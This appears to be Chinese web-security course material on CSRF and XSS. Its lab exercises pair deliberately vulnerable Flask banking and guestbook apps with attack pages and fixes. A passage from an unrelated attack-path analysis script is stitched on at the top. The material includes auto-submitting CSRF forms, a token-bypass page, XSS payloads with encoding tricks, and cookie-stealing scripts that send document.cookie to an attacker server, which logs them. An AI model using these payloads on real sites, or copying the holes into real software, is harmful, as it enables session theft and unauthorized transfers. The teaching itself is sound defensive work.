        """建议修复措施"""
        compromised = self.find_compromised_hosts()
        
        print("\n[建议修复措施]")
        for host in compromised:
            print(f"\n主机: {host}")
            node_data = self.graph.nodes[host]
            
            if node_data.get('type') == 'server':
                print("  - 立即隔离服务器")
                print("  - 创建系统快照")
                print("  - 检查是否有后门")
                print("  - 重置所有访问凭证")
            elif node_data.get('type') == 'workstation':
                print("  - 断开网络连接")
                print("  - 检查用户行为")
                print(f"  - 重置用户 {node_data.get('user')} 的密码")
                print("  - 扫描恶意软件")
        
        # 路径阻断建议
        print("\n[路径阻断建议]")
        for path in self.attack_paths:
            for step in path['path']:
                if step.get('from') and step.get('to'):
                    print(f"  - 在 {step['from']} 和 {step['to']} 之间添加防火墙规则")
    
    def visualize(self, output_file='attack_path.png'):
        """可视化攻击路径"""
        pos = nx.spring_layout(self.graph)
        
        plt.figure(figsize=(12, 8))
        
        # 绘制所有节点
        nx.draw_networkx_nodes(self.graph, pos, node_color='lightblue', 
                               node_size=500)
        
        # 绘制所有边
        nx.draw_networkx_edges(self.graph, pos, edge_color='gray', alpha=0.3)
        
        # 高亮受感染主机
        compromised = self.find_compromised_hosts()
        compromised_nodes = [n for n in self.graph.nodes if n in compromised]
        nx.draw_networkx_nodes(self.graph, pos, nodelist=compromised_nodes,
                              node_color='red', node_size=700)
        
        #
第四节课  CSRF攻击及防御
1.1 Cookie与Session机制
1.1.1 Cookie的工作原理
HTTP协议是无状态的，为了维持用户状态，引入了Cookie机制。服务器通过HTTP响应头中的Set-Cookie字段向客户端发送Cookie，浏览器在后续请求中自动在Cookie请求头中携带该Cookie。
响应头示例：

Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Lax
请求头示例：

Cookie: sessionid=abc123
1.1.2 Cookie的安全属性
HttpOnly：标记为HttpOnly的Cookie无法被JavaScript读取，可防御XSS攻击窃取Cookie。
Secure：仅当通过HTTPS连接时才发送该Cookie。
SameSite：控制跨站请求时是否携带Cookie，取值：
None：任何跨站请求都发送。
Lax：部分跨站请求（如链接、预加载）发送，但POST表单不发送。
Strict：任何跨站请求均不发送。
1.1.3 Session机制
服务器使用Session来存储用户的状态信息。用户登录后，服务器生成一个唯一的Session ID，并通过Cookie发送给客户端。后续请求携带该Session ID，服务器据此找到对应的Session数据。
1.2 CSRF攻击原理
1.2.1 定义
CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种利用用户在目标网站的已认证状态，诱使用户在不知情的情况下发送恶意请求的攻击方式。
1.2.2 攻击流程
用户登录信任网站A（如银行网站），浏览器保存了A的Cookie。
用户未登出A，又访问了恶意网站B。
B的页面中隐藏着自动向A发送请求的代码（如图片、表单自动提交）。
浏览器执行该代码时，自动携带A的Cookie向A发送请求。
A收到请求，由于Cookie有效，误以为是用户本人操作，执行了恶意请求（如转账、改密）。
1.2.3 示例
假设银行网站转账接口为：

POST /transfer HTTP/1.1
Host: bank.com
Cookie: sessionid=abc123
Content-Type: application/x-www-form-urlencoded

to_account=attacker&amount=1000
攻击者在恶意网站B中嵌入以下表单

<form id="attack" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to_account" value="attacker">
    <input type="hidden" name="amount" value="1000">
</form>
<script>document.getElementById('attack').submit();</script>
当已登录bank.com的用户访问B时，表单自动提交，完成转账。
1.3 CSRF攻击类型
1.3.1 GET型CSRF
若转账功能使用GET请求：

GET /transfer?to_account=attacker&amount=1000 HTTP/1.1
1.3.2 POST型CSRF
如上例中的自动提交表单。
1.3.3 JSON型CSRF
针对REST API的CSRF攻击。若API接受JSON数据，可构造如下表单：

<form id="attack" action="https://api.bank.com/transfer" method="POST" enctype="text/plain">
    <input type='text' name='{"to_account":"attacker","amount":1000}' value=''>
</form>
其中enctype="text/plain"可发送纯文本JSON数据。
1.4 CSRF防御技术
1.4.1 CSRF Token
服务器在生成表单时，生成一个随机Token并存储在Session中，同时作为隐藏字段放入表单。提交时验证Token是否匹配。
Flask示例：

import secrets
from flask import session, request

@app.route('/transfer', methods=['GET', 'POST'])
def transfer():
    if request.method == 'GET':
        token = secrets.token_hex(16)
        session['csrf_token'] = token
        return render_template('transfer.html', token=token)
    else:
        if request.form.get('csrf_token') != session.get('csrf_token'):
            return "CSRF攻击检测！", 403
        # 执行转账...
1.4.2 SameSite Cookie属性
设置Cookie的SameSite属性为Lax或Strict，可阻止跨站请求携带Cookie。

Set-Cookie: sessionid=abc123; SameSite=Lax
1.4.3 Referer验证
检查HTTP Referer头，确认请求来源是否合法。

referer = request.headers.get('Referer')
if not referer or not referer.startswith('https://bank.com'):
    return "非法请求", 403
但Referer可能被篡改或缺失，故不能作为唯一防御手段。
1.4.4 二次验证
对敏感操作要求输入密码、验证码等，可有效防御CSRF，但影响用户体验。
1.5 案例分析
1.5.1 银行转账CSRF漏洞
某银行手机APP转账接口缺乏CSRF防护，攻击者构造恶意页面诱骗已登录用户访问，导致资金被盗。修复方案：增加CSRF Token和验证码。
1.5.2 Session固定攻击
Session固定攻击是CSRF的一种变种。攻击者先访问网站获得一个Session ID，然后诱使用户使用该Session ID登录。用户登录后，攻击者即可用该Session ID冒充用户。
防御：用户登录成功后，重新生成Session ID。

第五课：XSS攻击及防御
2.1 XSS攻击概述
2.1.1 定义
XSS（Cross-Site Scripting，跨站脚本攻击）是指攻击者将恶意脚本注入到可信网站的页面中，当其他用户访问时，这些脚本在浏览器中执行。
2.1.2 攻击流程
攻击者在存在漏洞的网站上提交恶意脚本。
网站存储或反射这些脚本。
普通用户访问该网站。
恶意脚本在用户浏览器中执行。
脚本可窃取Cookie、记录键盘、钓鱼等。
2.1.3 危害
Cookie窃取：通过document.cookie获取Cookie并发送到攻击者服务器。
会话劫持：利用窃取的Cookie冒充用户。
键盘记录：监听用户输入，窃取密码等敏感信息。
网页钓鱼：修改页面内容，显示虚假登录框。
DDOS攻击：利用用户浏览器发起大量请求。
2.2 XSS攻击类型
2.2.1 反射型XSS
恶意脚本通过URL参数传递，服务器将参数反射回页面并立即执行。
示例：

@app.route('/search')
def search():
    keyword = request.args.get('q', '')
    return f'<h2>搜索 "{keyword}" 的结果</h2>'
若用户访问 /search?q=<script>alert('XSS')</script>，服务器返回的HTML中包含该脚本并执行。
2.2.2 存储型XSS
恶意脚本存储在服务器数据库或文件中，每次用户访问页面时都会触发。
示例：

comments = []
@app.route('/comment', methods=['POST'])
def add_comment():
    content = request.form.get('content')
    comments.append(content)  # 未过滤直接存储

@app.route('/comment')
def show_comments():
    html = '<h2>留言板</h2>'
    for c in comments:
        html += f'<div>{c}</div>'  # 未转义直接输出
    return html
攻击者提交包含<script>alert(1)</script>的留言后，每个访问留言板的用户都会触发脚本。
2.2.3 DOM型XSS
服务器返回的HTML正常，但客户端JavaScript在处理用户可控数据时，将其插入DOM导致脚本执行。
示例：

<script>
    var name = location.hash.substring(1);
    document.getElementById('greeting').innerHTML = 'Hello, ' + name;
</script>
若URL为page.html#<img src=x onerror=alert(1)>，innerHTML会将img标签作为HTML插入，触发onerror事件。
2.3 XSS攻击载荷
2.3.1 基本Payload

<script>alert('XSS')</script>
2.3.2 利用事件

<img src="x" onerror="alert(1)">
<svg onload="alert(1)">
<body onload="alert(1)">
<input type="text" onfocus="alert(1)" autofocus>
2.3.3 利用伪协议

<a href="javascript:alert(1)">点击</a>
<iframe src="javascript:alert(1)"></iframe>
2.3.4 编码绕过
HTML实体编码：

<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
URL编码：

<a href="javascript:%61%6c%65%72%74%28%31%29">点击</a>
2.3.5 标签闭合技巧
若输入被插入到标签属性中，可提前闭合标签注入脚本：

<input value="USER_INPUT">
攻击者可构造：

"><script>alert(1)</script><input value="
2.4 XSS防御技术
2.4.1 输出转义（最根本）
根据输出上下文对用户数据进行转义。
HTML上下文转义：使用html.escape()（Python）或类似函数。

import html
user_input = '<script>alert(1)</script>'
safe_output = html.escape(user_input)
# 结果：&lt;script&gt;alert(1)&lt;/script&gt;
JavaScript上下文转义：使用JSON序列化。

import json
user_input = "'; alert(1); //"
safe_js = json.dumps(user_input)
# 结果：'\'; alert(1); //'
2.4.2 输入过滤
对用户输入进行白名单过滤，只允许安全的字符。

import re
def filter_xss(input_str):
    return re.sub(r'[^\w\s\.\,\!\?\-]', '', input_str)
2.4.3 Content Security Policy（CSP）
通过HTTP头限制资源加载来源，可有效防御XSS。

Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
该策略禁止内联脚本执行，只允许加载同源或指定可信源的脚本。
2.4.4 HttpOnly Cookie
设置Cookie的HttpOnly属性，防止JavaScript读取Cookie。

Set-Cookie: sessionid=abc123; HttpOnly
2.4.5 使用安全框架
现代前端框架（如React、Vue、Angular）默认对输出进行转义，降低XSS风险。

// React中，以下写法是安全的（自动转义）
<div>{userInput}</div>

// 危险写法（需要确保userInput已转义）
<div dangerouslySetInnerHTML={{__html: userInput}} />
2.5 实战案例分析
2.5.1 社交媒体留言板XSS
某社交网站留言板未对用户输入进行过滤和转义，攻击者发布包含恶意脚本的留言，导致所有查看留言的用户Cookie被窃取。修复方案：对输出进行HTML转义，并设置HttpOnly Cookie。
2.5.2 搜索引擎反射型XSS
某搜索引擎在搜索结果页面直接显示用户输入的搜索关键词，未做转义，导致反射型XSS漏洞。攻击者可通过发送恶意链接诱导用户点击。修复方案：对输出进行HTML转义。
2.5.3 富文本编辑器XSS绕过
富文本编辑器通常允许用户输入HTML标签，但若过滤不严，攻击者可利用事件处理器或伪协议绕过。修复方案：使用白名单过滤，只允许安全的标签和属性，并对属性值进行严格检查。


练习1-1：GET型CSRF漏洞复现
题目描述
构建一个存在GET型CSRF漏洞的银行转账应用，并编写恶意页面实现自动转账。
漏洞代码（bank_get_vulnerable.py）

"""
漏洞应用：银行转账系统（GET方式，无CSRF防护）
运行：python bank_get_vulnerable.py
"""
from flask import Flask, request, make_response, render_template_string

app = Flask(__name__)

# 模拟用户数据库
users = {
    'alice': {'password': '123456', 'balance': 1000},
    'attacker': {'password': 'hack', 'balance': 0}
}

@app.route('/')
def index():
    username = request.cookies.get('username')
    if not username:
        return '请先<a href="/login">登录</a>'
    balance = users.get(username, {}).get('balance', 0)
    return f'欢迎 {username}，余额：${balance}<br><a href="/transfer?to_account=bob&amount=10">转账10给bob</a>'

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username in users and users[username]['password'] == password:
            resp = make_response('登录成功！<a href="/">返回首页</a>')
            resp.set_cookie('username', username)
            return resp
        return '登录失败'
    return '''
    <form method="post">
        用户名: <input name="username"><br>
        密码: <input type="password" name="password"><br>
        <input type="submit" value="登录">
    </form>
    '''

@app.route('/transfer')
def transfer():
    """GET方式转账（漏洞点）"""
    username = request.cookies.get('username')
    if not username:
        return '请先登录', 401

    to_account = request.args.get('to_account')
    amount = int(request.args.get('amount', 0))

    if username not in users:
        return '用户不存在'

    if users[username]['balance'] < amount:
        return '余额不足'

    # 扣钱
    users[username]['balance'] -= amount
    # 给收款人加钱（简化，若不存在则创建）
    if to_account not in users:
        users[to_account] = {'balance': 0}
    users[to_account]['balance'] += amount

    return f'转账成功！向 {to_account} 转账 ${amount}'

if __name__ == '__main__':
    app.run(debug=True, port=5000)
讲解：
转账接口使用GET方法，参数通过URL传递。
认证仅依赖Cookie中的username，未使用任何CSRF Token。
攻击者可构造恶意页面，利用<img>标签自动发起GET请求。
攻击代码（evil_get.html）

<!DOCTYPE html>
<html>
<head>
    <title>恶意页面</title>
</head>
<body>
    <h1>恭喜你中奖了！</h1>
    <!-- 隐藏图片，自动发起GET请求 -->
    <img src="http://127.0.0.1:5000/transfer?to_account=attacker&amount=500" style="display:none">
</body>
</html>
讲解：
当用户访问此页面时，浏览器会加载图片，向http://127.0.0.1:5000/transfer?to_account=attacker&amount=500发起GET请求。
如果用户已登录银行系统，浏览器会自动携带Cookie，导致转账被执行。
防御代码（修复GET型CSRF）

"""
修复方案：
1. 将敏感操作改为POST方法
2. 添加CSRF Token验证
"""
from flask import Flask, request, make_response, session, render_template_string
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

users = {'alice': {'password': '123456', 'balance': 1000}, 'attacker': {'balance': 0}}

@app.route('/')
def index():
    username = request.cookies.get('username')
    if not username:
        return '请先<a href="/login">登录</a>'
    balance = users.get(username, {}).get('balance', 0)
    # 生成CSRF Token用于表单
    token = secrets.token_hex(16)
    session['csrf_token'] = token
    return render_template_string('''
        欢迎 {{ username }}，余额：${{ balance }}<br>
        <form method="post" action="/transfer">
            <input type="hidden" name="csrf_token" value="{{ token }}">
            收款账户: <input name="to_account"><br>
            金额: <input name="amount"><br>
            <input type="submit" value="转账">
        </form>
    ''', username=username, balance=balance, token=token)

@app.route('/login', methods=['GET', 'POST'])
def login():
    # ...（同漏洞代码，略）
    pass

@app.route('/transfer', methods=['POST'])
def transfer():
    """POST方式，验证CSRF Token"""
    username = request.cookies.get('username')
    if not username:
        return '请先登录', 401

    # 验证CSRF Token
    token = request.form.get('csrf_token')
    if not token or token != session.get('csrf_token'):
        return 'CSRF攻击检测！', 403

    to_account = request.form.get('to_account')
    amount = int(request.form.get('amount', 0))

    # ...（转账逻辑，略）
    return '转账成功'
讲解：
将转账接口改为POST，并添加CSRF Token验证。
Token在生成表单时存入Session，提交时比对，确保请求来自本网站表单。
攻击者无法获取Token，因此无法构造有效请求。
预期结果：攻击页面无法触发转账，因为请求为GET且无Token。

练习1-2：POST型CSRF漏洞复现
题目描述
利用自动提交表单实现POST型CSRF攻击。
漏洞代码（bank_post_vulnerable.py）

"""
漏洞应用：银行转账系统（POST方式，无CSRF防护）
运行：python bank_post_vulnerable.py
"""
from flask import Flask, request, make_response

app = Flask(__name__)
users = {'alice': {'password': '123456', 'balance': 1000}, 'attacker': {'balance': 0}}

# 登录和首页代码同练习1-1，此处省略
# 关键接口如下：

@app.route('/transfer', methods=['POST'])
def transfer():
    """POST方式转账（漏洞点：无Token验证）"""
    username = request.cookies.get('username')
    if not username:
        return '请先登录', 401

    to_account = request.form.get('to_account')
    amount = int(request.form.get('amount', 0))

    if username not in users:
        return '用户不存在'

    if users[username]['balance'] < amount:
        return '余额不足'

    users[username]['balance'] -= amount
    if to_account not in users:
        users[to_account] = {'balance': 0}
    users[to_account]['balance'] += amount

    return f'转账成功！向 {to_account} 转账 ${amount}'

if __name__ == '__main__':
    app.run(debug=True, port=5000)
讲解：
转账接口使用POST方法，但未验证CSRF Token。
仅依赖Cookie认证，存在CSRF漏洞。
攻击代码（evil_post.html）

<!DOCTYPE html>
<html>
<head>
    <title>恶意页面</title>
</head>
<body>
    <h1>加载中，请稍候...</h1>
    <!-- 隐藏表单 -->
    <form id="csrf" action="http://127.0.0.1:5000/transfer" method="POST">
        <input type="hidden" name="to_account" value="attacker">
        <input type="hidden" name="amount" value="500">
    </form>
    <script>
        // 自动提交表单
        document.getElementById('csrf').submit();
    </script>
</body>
</html>
讲解：
页面包含一个隐藏表单，通过JavaScript自动提交。
用户访问时，表单POST到银行接口，携带Cookie，完成转账。
防御代码（同练习1-1的防御代码）
添加CSRF Token验证即可防御。
预期结果：攻击页面提交后，由于无Token，被服务器拒绝（需实现防御）。

练习1-3：CSRF Token防御实现
题目描述
为转账功能添加CSRF Token验证，防御CSRF攻击。
防御代码（完整实现，含Token生成与验证）

"""
修复后的银行应用（含CSRF Token）
运行：python bank_csrf_fixed.py
"""
from flask import Flask, request, make_response, session, render_template_string
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

users = {'alice': {'password': '123456', 'balance': 1000}, 'attacker': {'balance': 0}}

@app.route('/')
def index():
    username = request.cookies.get('username')
    if not username:
        return '请先<a href="/login">登录</a>'
    balance = users.get(username, {}).get('balance', 0)
    # 生成Token
    token = secrets.token_hex(16)
    session['csrf_token'] = token
    return render_template_string('''
        <h2>欢迎 {{ username }}，余额：${{ balance }}</h2>
        <form method="post" action="/transfer">
            <input type="hidden" name="csrf_token" value="{{ token }}">
            收款账户: <input type="text" name="to_account"><br>
            金额: <input type="number" name="amount"><br>
            <input type="submit" value="转账">
        </form>
    ''', username=username, balance=balance, token=token)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username in users and users[username]['password'] == password:
            resp = make_response('登录成功！<a href="/">返回首页</a>')
            resp.set_cookie('username', username)
            return resp
        return '登录失败'
    return '''
    <form method="post">
        用户名: <input name="username"><br>
        密码: <input type="password" name="password"><br>
        <input type="submit" value="登录">
    </form>
    '''

@app.route('/transfer', methods=['POST'])
def transfer():
    username = request.cookies.get('username')
    if not username:
        return '请先登录', 401

    # 验证CSRF Token
    token = request.form.get('csrf_token')
    if not token or token != session.get('csrf_token'):
        return 'CSRF攻击检测！', 403

    to_account = request.form.get('to_account')
    amount = int(request.form.get('amount', 0))

    if username not in users:
        return '用户不存在'

    if users[username]['balance'] < amount:
        return '余额不足'

    users[username]['balance'] -= amount
    if to_account not in users:
        users[to_account] = {'balance': 0}
    users[to_account]['balance'] += amount

    return f'转账成功！向 {to_account} 转账 ${amount}'

if __name__ == '__main__':
    app.run(debug=True, port=5000)
讲解：
Token生成：secrets.token_hex(16)生成随机字符串，存入session。
表单中通过隐藏字段传递Token。
处理POST时，比对请求中的Token与Session中的值，不一致则拒绝。
由于攻击者无法获取Session中的Token（同源策略限制），无法伪造有效请求。
测试：
正常提交表单可成功转账。
使用之前的恶意页面（evil_post.html）尝试攻击，将返回403。

练习1-4：SameSite Cookie防御实验
题目描述
通过设置Cookie的SameSite属性防御CSRF，并观察不同属性值的效果。
漏洞代码（带SameSite配置）

"""
SameSite Cookie防御实验
运行：python bank_samesite.py
"""
from flask import Flask, request, make_response, render_template_string

app = Flask(__name__)
users = {'alice': {'password': '123456', 'balance': 1000}, 'attacker': {'balance': 0}}

@app.route('/')
def index():
    username = request.cookies.get('username')
    if not username:
        return '请先<a href="/login">登录</a>'
    balance = users.get(username, {}).get('balance', 0)
    return f'欢迎 {username}，余额：${balance}<br><a href="/transfer?to_account=attacker&amount=500">转账</a>（GET）'

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username in users and users[username]['password'] == password:
            resp = make_response('登录成功！<a href="/">返回首页</a>')
            # 重点：设置SameSite属性，可修改为Lax或Strict
            resp.set_cookie('username', username, samesite='Lax')  # 可改为'Strict'或'None'
            return resp
        return '登录失败'
    return '''
    <form method="post">
        用户名: <input name="username"><br>
        密码: <input type="password" name="password"><br>
        <input type="submit" value="登录">
    </form>
    '''

@app.route('/transfer')
def transfer():
    username = request.cookies.get('username')
    if not username:
        return '请先登录', 401
    to_account = request.args.get('to_account')
    amount = int(request.args.get('amount', 0))
    # 转账逻辑...
    return f'转账成功！向 {to_account} 转账 ${amount}'

if __name__ == '__main__':
    app.run(debug=True, port=5000)
测试步骤
设置SameSite=Lax：
登录后，打开恶意页面（evil_get.html），观察是否触发转账。
Lax模式下，GET跨站请求会携带Cookie，因此转账仍可能成功。
设置SameSite=Strict：
修改代码为resp.set_cookie('username', username, samesite='Strict')。
重新登录，再次测试恶意页面。
Strict模式下，跨站请求不会携带Cookie，因此攻击失败。
设置SameSite=None; Secure：
若需在跨站请求中携带Cookie（如单点登录），可设为None，但必须同时设置Secure（仅HTTPS）。
在本地HTTP环境下，浏览器可能忽略None，需要配置HTTPS测试。
讲解：
SameSite属性是浏览器级别的防御，无需修改应用逻辑。
Lax：大多数跨站子请求（如图片、链接）会携带Cookie，但POST表单不会。
Strict：所有跨站请求均不携带Cookie，最强防御但可能影响用户体验（如从外部链接访问本站会丢失登录状态）。
None：允许跨站携带Cookie，需配合Secure，不防御CSRF。
预期结果：
Lax：GET型CSRF仍可能成功。
Strict：GET型CSRF失败。

练习1-5：CSRF Token绕过尝试
题目描述
分析不安全的CSRF Token实现，尝试绕过防御。
漏洞代码（不安全的Token实现）

"""
有缺陷的CSRF Token实现
运行：python bank_insecure_token.py
"""
from flask import Flask, request, make_response, session, render_template_string
import secrets

app = Flask(__name__)
app.secret_key = 'secret'  # 固定密钥，不安全

users = {'alice': {'password': '123456', 'balance': 1000}, 'attacker': {'balance': 0}}

# 缺陷1：Token存储在Cookie中，且无HttpOnly
# 缺陷2：Token未绑定Session，全局共享
global_token = secrets.token_hex(16)  # 每次重启服务器改变，但所有用户相同

@app.route('/')
def index():
    username = request.cookies.get('username')
    if not username:
        return '请先<a href="/login">登录</a>'
    balance = users.get(username, {}).get('balance', 0)
    # 将Token存入Cookie（可被JS读取）
    resp = make_response(render_template_string('''
        <h2>欢迎 {{ username }}，余额：${{ balance }}</h2>
        <form method="post" action="/transfer">
            <input type="hidden" name="csrf_token" value="{{ token }}">
            收款账户: <input type="text" name="to_account"><br>
            金额: <input type="number" name="amount"><br>
            <input type="submit" value="转账">
        </form>
    ''', username=username, balance=balance, token=global_token))
    resp.set_cookie('csrf_token', global_token)  # 将Token放入Cookie
    return resp

@app.route('/login', methods=['GET', 'POST'])
def login():
    # ...（同前）
    pass

@app.route('/transfer', methods=['POST'])
def transfer():
    username = request.cookies.get('username')
    if not username:
        return '请先登录', 401

    # 验证Token：从Cookie和表单中获取，比对
    cookie_token = request.cookies.get('csrf_token')
    form_token = request.form.get('csrf_token')
    if not form_token or form_token != cookie_token:
        return 'CSRF攻击检测！', 403

    # 转账逻辑...
    return '转账成功'

if __name__ == '__main__':
    app.run(debug=True, port=5000)
讲解：
缺陷：Token存储在Cookie中，且未设置HttpOnly，因此JavaScript可以读取。
缺陷：Token全局共享，不绑定用户Session。
攻击代码（利用Cookie中的Token）

"""
绕过CSRF Token的攻击页面
需要先诱导用户访问此页面，页面会读取Cookie中的Token并构造表单提交
"""
import requests
from flask import Flask, request

# 攻击者服务器，用于接收窃取的Token
app = Flask(__name__)

@app.route('/')
def index():
    # 此页面被用户访问时，由于攻击者无法直接读取用户Cookie，需要通过其他方式
    # 但若攻击者能执行JavaScript，可以读取document.cookie
    # 下面是一个利用反射型XSS或其他漏洞获取Token的示例
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <script>
            // 尝试读取Cookie中的csrf_token
            function getCookie(name) {
                const value = `; ${document.cookie}`;
                const parts = value.split(`; ${name}=`);
                if (parts.length === 2) return parts.pop().split(';').shift();
            }
            var token = getCookie('csrf_token');
            if (token) {
                // 构造自动提交表单
                var form = document.createElement('form');
                form.method = 'POST';
                form.action = 'http://127.0.0.1:5000/transfer';
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'csrf_token';
                input.value = token;
                form.appendChild(input);
                var to = document.createElement('input');
                to.type = 'hidden';
                to.name = 'to_account';
                to.value = 'attacker';
                form.appendChild(to);
                var amount = document.createElement('input');
                amount.type = 'hidden';
                amount.name = 'amount';
                amount.value = '500';
                form.appendChild(amount);
                document.body.appendChild(form);
                form.submit();
            } else {
                document.write('无法获取Token');
            }
        </script>
    </head>
    <body>
    </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(port=8000)
讲解：
由于Token在Cookie中且无HttpOnly，攻击者可以通过JavaScript读取。
恶意页面读取Token后，自动构造包含正确Token的表单提交，从而绕过CSRF防御。
此攻击需要用户浏览器执行JavaScript（通常都支持），且没有其他限制（如CSP阻止内联脚本）。
防御改进：
Token不应存储在Cookie中，或设置HttpOnly。
Token应绑定用户Session，并确保每次提交后失效或刷新。
使用CSP限制脚本来源，阻止内联脚本执行。
练习2-1：反射型XSS复现
题目描述
构建一个存在反射型XSS漏洞的搜索页面，并触发弹窗。
漏洞代码（xss_reflected.py）

"""
反射型XSS漏洞应用
运行：python xss_reflected.py
"""
from flask import Flask, request

app = Flask(__name__)

@app.route('/search')
def search():
    q = request.args.get('q', '')
    # 漏洞：直接将用户输入拼接到HTML中
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>搜索</title></head>
    <body>
        <h1>您搜索的内容：{q}</h1>
        <form action="/search">
            <input type="text" name="q" value="{q}">
            <input type="submit" value="搜索">
        </form>
    </body>
    </html>
    '''
    return html

if __name__ == '__main__':
    app.run(debug=True, port=5001)
讲解：
用户输入的q参数直接被插入HTML，未做任何转义。
攻击者可构造包含JavaScript的URL，使脚本在受害者浏览器中执行。
攻击URL
访问：

http://127.0.0.1:5001/search?q=<script>alert('XSS')</script>
预期：弹窗显示"XSS"。
防御代码（输出转义）

"""
修复后的反射型XSS应用
"""
from flask import Flask, request
import html

app = Flask(__name__)

@app.route('/search')
def search():
    q = request.args.get('q', '')
    safe_q = html.escape(q)  # 转义HTML特殊字符
    html_content = f'''
    <!DOCTYPE html>
    <html>
    <head><title>搜索</title></head>
    <body>
        <h1>您搜索的内容：{safe_q}</h1>
        <form action="/search">
            <input type="text" name="q" value="{safe_q}">
            <input type="submit" value="搜索">
        </form>
    </body>
    </html>
    '''
    return html_content

if __name__ == '__main__':
    app.run(debug=True, port=5001)
讲解：
使用html.escape()将<、>等字符转换为HTML实体，使脚本无法执行。
输入<script>变为&lt;script&gt;，显示为普通文本。

练习2-2：存储型XSS复现
题目描述
实现一个留言板功能，存在存储型XSS漏洞，并利用其窃取Cookie。
漏洞代码（xss_stored.py）

"""
存储型XSS漏洞应用（留言板）
运行：python xss_stored.py
"""
from flask import Flask, request, render_template_string

app = Flask(__name__)
comments = []  # 存储留言

@app.route('/comment', methods=['GET', 'POST'])
def comment():
    global comments
    if request.method == 'POST':
        content = request.form.get('content', '')
        comments.append(content)  # 直接存储，未过滤

    # 显示所有留言
    html = '''
    <!DOCTYPE html>
    <html>
    <head><title>留言板</title></head>
    <body>
        <h2>留言板</h2>
        <form method="post">
            <textarea name="content" rows="4" cols="50"></textarea><br>
            <input type="submit" value="留言">
        </form>
        <hr>
    '''
    for c in comments:
        html += f'<div>{c}</div>\n'  # 直接输出，未转义
    html += '</body></html>'
    return render_template_string(html)

if __name__ == '__main__':
    app.run(debug=True, port=5002)
讲解：
留言内容直接存入列表，输出时未转义，导致存储型XSS。
攻击代码（提交恶意留言）
使用浏览器访问留言板，提交以下内容：

<script>
    var img = new Image();
    img.src = 'http://127.0.0.1:8000/steal?cookie=' + document.cookie;
</script>
或使用fetch：

<script>
    fetch('http://127.0.0.1:8000/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
攻击者服务器（attacker_server.py）

"""
攻击者服务器，接收窃取的Cookie
运行：python attacker_server.py
"""
from flask import Flask, request

app = Flask(__name__)

@app.route('/steal')
def steal():
    cookie = request.args.get('cookie', '')
    print(f'[!] 窃取到Cookie: {cookie}')
    with open('stolen_cookies.txt', 'a') as f:
        f.write(f'{cookie}\n')
    return 'OK'  # 返回空图片或任意内容

if __name__ == '__main__':
    app.run(port=8000)
讲解：
攻击者服务器监听8000端口，记录收到的Cookie。
当其他用户访问留言板时，恶意脚本会向攻击者服务器发送请求，携带Cookie。
防御代码（输出转义）

"""
修复后的留言板
"""
from flask import Flask, request, render_template_string
import html

app = Flask(__name__)
comments = []

@app.route('/comment', methods=['GET', 'POST'])
def comment():
    global comments
    if request.method == 'POST':
        content = request.form.get('content', '')
        # 存储时转义（也可存储原始，输出时转义）
        safe_content = html.escape(content)
        comments.append(safe_content)

    html = '''
    <!DOCTYPE html>
    <html>
    <head><title>留言板</title></head>
    <body>
        <h2>留言板</h2>
        <form method="post">
            <textarea name="content" rows="4" cols="50"></textarea><br>
            <input type="submit" value="留言">
        </form>
        <hr>
    '''
    for c in comments:
        html += f'<div>{c}</div>\n'  # 已转义，安全
    html += '</body></html>'
    return render_template_string(html)
讲解：
在存储或输出时对内容进行HTML转义，使脚本无法执行。
同时可设置HttpOnly Cookie，防止JavaScript读取Cookie，增加防御深度。

练习2-3：DOM型XSS复现
题目描述
创建一个包含DOM型XSS漏洞的页面，并利用URL片段触发XSS。
漏洞代码（dom_xss.html）

<!DOCTYPE html>
<html>
<head>
    <title>DOM XSS 演示</title>
</head>
<body>
    <h1>欢迎</h1>
    <div id="greeting"></div>
    <script>
        // 从URL片段中获取参数，直接插入DOM
        var name = location.hash.substring(1);  // 获取#后面的内容
        document.getElementById('greeting').innerHTML = 'Hello, ' + name;
    </script>
</body>
</html>
讲解：
location.hash获取URL中#后面的部分，用户可控。
innerHTML将内容作为HTML插入，导致XSS。
攻击URL
访问：

file:///path/to/dom_xss.html#<img src=x onerror=alert('XSS')>
或通过HTTP服务器访问：

http://127.0.0.1:5003/dom_xss.html#<img src=x onerror=alert('XSS')>
预期：弹窗出现。
防御代码（使用textContent代替innerHTML）

<!DOCTYPE html>
<html>
<head>
    <title>DOM XSS 修复</title>
</head>
<body>
    <h1>欢迎</h1>
    <div id="greeting"></div>
    <script>
        var name = location.hash.substring(1);
        // 使用textContent，将内容作为纯文本处理
        document.getElementById('greeting').textContent = 'Hello, ' + name;
    </script>
</body>
</html>
讲解：
textContent不会解析HTML标签，因此恶意代码被当作普通文本显示。
若必须插入HTML，应对输入进行转义或使用安全库（如DOMPurify）。

练习2-4：XSS防御实现（输出转义与CSP）
题目描述
为留言板应用添加XSS防御措施（输出转义和CSP），并验证效果。
防御代码（xss_defended.py）

"""
带有XSS防御的留言板（输出转义 + CSP）
运行：python xss_defended.py
"""
from flask import Flask, request, make_response, render_template_string
import html

app = Flask(__name__)
comments = []

@app.route('/comment', methods=['GET', 'POST'])
def comment():
    global comments
    if request.method == 'POST':
        content = request.form.get('content', '')
        # 存储原始内容，输出时转义
        comments.append(content)

    # 构建HTML
    html_content = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>安全留言板</title>
        <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
    </head>
    <body>
        <h2>安全留言板</h2>
        <form method="post">
            <textarea name="content" rows="4" cols="50"></textarea><br>
